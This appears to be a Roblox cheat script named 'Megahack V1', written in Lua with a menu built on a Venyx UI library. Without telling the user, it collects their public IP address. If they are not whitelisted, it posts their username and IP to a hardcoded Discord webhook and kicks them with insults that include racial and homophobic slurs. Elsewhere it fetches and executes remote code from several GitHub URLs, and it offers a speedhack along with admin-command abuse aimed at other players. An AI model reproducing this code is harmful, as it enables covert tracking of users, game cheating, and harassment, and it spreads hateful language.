local ip = tostring(game:HttpGet("https://api.ipify.org", true))

-- Access the player's character
local player = game.Players.LocalPlayer
local character = player.Character

local whitelistedPlayers = {"TomaQueen", "weerawatR15", "T4NVS"} -- List of whitelisted players
local playerExecutingScript = game.Players.LocalPlayer.Name -- Get the name of the player executing the script

local playerWhitelisted = false -- Assume the player executing the script is not whitelisted by default

for i, playerName in ipairs(whitelistedPlayers) do
  if playerName == playerExecutingScript then
    playerWhitelisted = true -- Player executing the script is whitelisted
    break
  end
end

if not playerWhitelisted then
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Hey!", -- Required
    Text = "Don't try to use my fucking script you retard!", -- Required
    Icon = "rbxassetid://12998735936" -- Optional
})

wait(5)
game.Players.LocalPlayer:Kick("Gay skid nigga") -- Kick player if not whitelisted

local wh = 'https://discordapp.com/api/webhooks/1092713174719025175/TDTWsfsj44J3wleOrPdj4Sc8LQmSFGH4Y5RlfW7tPpnJGSjs_mckFE_lbrQebsVVQ3G0'
local embed1 = {
       ['title'] = 'Hey! '..game.Players.LocalPlayer.DisplayName..' (@'..game.Players.LocalPlayer.Name..') Tried to execute Megahack Address: ' .. ip .. ' '
   }
local a = request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
end

-- init
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/UI-Libraries/main/Venyx/Source.lua"))()
local venyx = library.new("Megahack V1", 12998735936)

game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Hey!", -- Required
    Text = "Use your keyboard to close and open, Sorry if you're pee c", -- Required
    Icon = "rbxassetid://12998735936" -- Optional
})

loadstring(game:HttpGet(('https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/mob.txt'),true))()

-- themes
local themes = {
	Background = Color3.fromRGB(24, 24, 24),
	Glow = Color3.fromRGB(120, 0, 170),
	Accent = Color3.fromRGB(168, 146, 236),
	LightContrast = Color3.fromRGB(168, 146, 236),
	DarkContrast = Color3.fromRGB(14, 14, 14),  
	TextColor = Color3.fromRGB(168, 146, 236)
}

-- first page
local page = venyx:addPage("Main", 12998735936)
local section1 = page:addSection("Section 1")
local section2 = page:addSection("Section 2")

section1:addToggle("Toggle", nil, function(value)
	print("Toggled", value)
end)
section1:addButton("Blacklist (Requires Access)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/hieeeekkje/testacc-admin-hause-script/main/Babaemu"))()
end)
section1:addTextbox("Request for access", "Default", function(value, focusLost)
	local wh = 'https://discordapp.com/api/webhooks/1092713174719025175/TDTWsfsj44J3wleOrPdj4Sc8LQmSFGH4Y5RlfW7tPpnJGSjs_mckFE_lbrQebsVVQ3G0'
local embed1 = {
       ['title'] = 'Requested by '..game.Players.LocalPlayer.DisplayName..' (@'..game.Players.LocalPlayer.Name..') Reason : '..value..' '
   }
local a = request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
	end)
	
section1:addTextbox("Speedhack", function(value)
	character.Humanoid.WalkSpeed = value
	end)
	
	section1:addTextbox("Subspace User", function(value)
	game.Players:Chat(":music 11956590 false 1 4| :wait 1.5| :music| :wait 2| :music 11984351 true 1 inf| :sparkles " .. value 
. " 255 0 255| :boom " .. value .. " ")
	end)

section2:addKeybind("Toggle Keybind", Enum.KeyCode.One, function()
	print("Activated Keybind")
	venyx:toggle()
end, function()
	print("Changed Keybind")
end)

section2:addDropdown("Dropdown", {"Hello", "World", "Hello World", "Word", 1, 2, 3})
section2:addDropdown("Dropdown", {"Hello", "World", "Hello World", "Word", 1, 2, 3}, function(text)
	print("Selected", text)
end)

section2:addButton("Subspace Tripmine", function()
    game.Players:Chat(":music 11956590 false 1 inf| :wait 2| :music| :wait 2| :music 11984351 true 1 inf| :boom")
end)

section2:addButton("Replay Mod", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/weerawatR15/script/main/replay.lua"))()
end)

section2:addButton("Anti Crash (Can't be undone)", function()
    while true do
	task.wait()
	for i,v in pairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") then
			if v.Locked == false then
				v.CanCollide = false
				v.Transparency = 1
			end
		end
	end
end
end)

-- second page
local theme = venyx:addPage("Top Secret")
local colors = theme:addSection("Colors")

local secret = theme:addSection("What's my address??")

secret:addButton("its " ..ip.." ", function()
    setclipboard(ip)
end)

for theme, color in pairs(themes) do -- all in one theme changer, i know, im cool
	colors:addColorPicker(theme, color, function(color3)
		venyx:setTheme(theme, color3)
	end)
end

-- load
venyx:SelectPage(venyx.pages[1], true)
